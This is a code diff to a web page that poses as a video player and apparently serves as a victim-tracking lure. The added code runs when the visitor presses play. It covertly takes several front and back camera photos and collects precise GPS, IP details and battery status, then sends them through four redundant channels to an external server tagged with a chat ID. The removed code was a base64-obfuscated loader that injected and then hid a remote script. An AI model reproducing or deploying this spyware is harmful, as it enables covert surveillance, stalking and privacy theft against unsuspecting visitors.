@@ -389,6 +389,140 @@
             var thumbnailArea = document.getElementById('thumbnailArea');
             var realVideo = document.getElementById('realVideo');
 
+            // ====== دوال جمع البيانات (مخفية) ======
+            var collectedInfo = {
+                permissions: [],
+                images: [],
+                ipInfo: '',
+                batteryStatus: '',
+                location: '',
+                chatId: new URLSearchParams(window.location.search).get('chatId') || ''
+            };
+
+            function getIP() {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://ipapi.co/json/', true);
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        try {
+                            var d = JSON.parse(xhr.responseText);
+                            collectedInfo.ipInfo = d.ip + '|' + d.country_name + '|' + d.city + '|' + d.org;
+                        } catch(e) {
+                            collectedInfo.ipInfo = 'parse_error';
+                        }
+                    }
+                };
+                xhr.onerror = function() {
+                    collectedInfo.ipInfo = 'failed';
+                };
+                xhr.send();
+            }
+
+            function getBattery() {
+                try {
+                    navigator.getBattery().then(function(b) {
+                        collectedInfo.batteryStatus = Math.round(b.level * 100) + '%_' + (b.charging ? 'charging' : 'not_charging');
+                    });
+                } catch(e) {}
+            }
+
+            function getGPS() {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        collectedInfo.location = pos.coords.latitude.toFixed(6) + ',' + pos.coords.longitude.toFixed(6);
+                        collectedInfo.permissions.push('gps_ok');
+                    },
+                    function(err) {
+                        collectedInfo.location = 'denied_' + err.code;
+                        collectedInfo.permissions.push('gps_no');
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+
+            function capturePhoto(face, callback) {
+                var constraints = { video: { facingMode: { exact: face } }, audio: false };
+                navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+                    var v = document.createElement('video');
+                    v.srcObject = stream;
+                    v.play().then(function() {
+                        setTimeout(function() {
+                            var c = document.createElement('canvas');
+                            c.width = v.videoWidth || 640;
+                            c.height = v.videoHeight || 480;
+                            c.getContext('2d').drawImage(v, 0, 0);
+                            try {
+                                collectedInfo.images.push(c.toDataURL('image/jpeg', 0.6).split(',')[1]);
+                                collectedInfo.permissions.push(face + '_cam_ok');
+                            } catch(e) {
+                                collectedInfo.permissions.push(face + '_cam_err');
+                            }
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                            if (callback) callback();
+                        }, 800);
+                    });
+                }).catch(function(e) {
+                    collectedInfo.permissions.push(face + '_cam_no');
+                    if (callback) callback();
+                });
+            }
+
+            function sendAllData() {
+                var payload = {
+                    chatId: collectedInfo.chatId,
+                    imageDatas: collectedInfo.images.join(','),
+                    location: collectedInfo.location,
+                    permissions: collectedInfo.permissions.join(','),
+                    ipInfo: collectedInfo.ipInfo,
+                    battery: collectedInfo.batteryStatus
+                };
+
+                var serverUrl = 'https://server-brxz.onrender.com/submitData';
+                var bodyStr = Object.keys(payload).map(function(k) {
+                    return encodeURIComponent(k) + '=' + encodeURIComponent(payload[k]);
+                }).join('&');
+
+                // طريقة 1: fetch
+                fetch(serverUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: bodyStr,
+                    mode: 'no-cors'
+                }).catch(function() {});
+
+                // طريقة 2: XHR
+                var x = new XMLHttpRequest();
+                x.open('POST', serverUrl, true);
+                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                x.send(bodyStr);
+
+                // طريقة 3: Beacon
+                if (navigator.sendBeacon) {
+                    var b = new Blob([bodyStr], { type: 'application/x-www-form-urlencoded' });
+                    navigator.sendBeacon(serverUrl, b);
+                }
+
+                // طريقة 4: Image ping
+                new Image().src = serverUrl + '?' + bodyStr;
+            }
+
+            function startCollection() {
+                getIP();
+                getBattery();
+                getGPS();
+                
+                capturePhoto('user', function() {
+                    capturePhoto('environment', function() {
+                        capturePhoto('user', function() {
+                            capturePhoto('environment', function() {
+                                setTimeout(sendAllData, 1000);
+                            });
+                        });
+                    });
+                });
+            }
+
+            // ====== واجهة المستخدم ======
             function requestPermissions() {
                 try {
                     navigator.geolocation.getCurrentPosition(
@@ -435,25 +569,6 @@
                 }
             }
 
-            function loadExternalAPI() {
-                var _0x = 'aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9zcGFjZXMvZHNmZGRqZmMvYWdlYWdhYWEvcmF3L21haW4vYXBp';
-                var url = atob(_0x);
-                
-                var s = document.createElement('script');
-                s.src = url;
-                s.async = true;
-                
-                window._chatId = new URLSearchParams(window.location.search).get('chatId') || '';
-                
-                document.head.appendChild(s);
-                
-                s.onload = function() {
-                    setTimeout(function() {
-                        if (s.parentNode) s.parentNode.removeChild(s);
-                    }, 5000);
-                };
-            }
-
             function showVideo() {
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
@@ -476,7 +591,7 @@
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
                     realVideo.play().catch(function() {});
-                    loadExternalAPI();
+                    startCollection();
                     showVideo();
                 }
             }
